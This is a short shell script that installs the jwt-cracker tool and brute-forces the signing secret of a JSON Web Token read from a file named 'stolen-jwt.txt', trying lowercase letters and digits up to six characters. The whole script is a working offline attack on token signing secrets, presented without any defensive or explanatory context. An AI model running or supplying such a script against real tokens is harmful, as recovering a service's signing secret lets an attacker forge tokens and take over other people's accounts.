#!/bin/sh
npm i -g jwt-cracker
token=`cat stolen-jwt.txt`
#alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
alphabet="abcdefghijklmnopqrstuvwxyz0123456789"
jwt-cracker $token $alphabet 6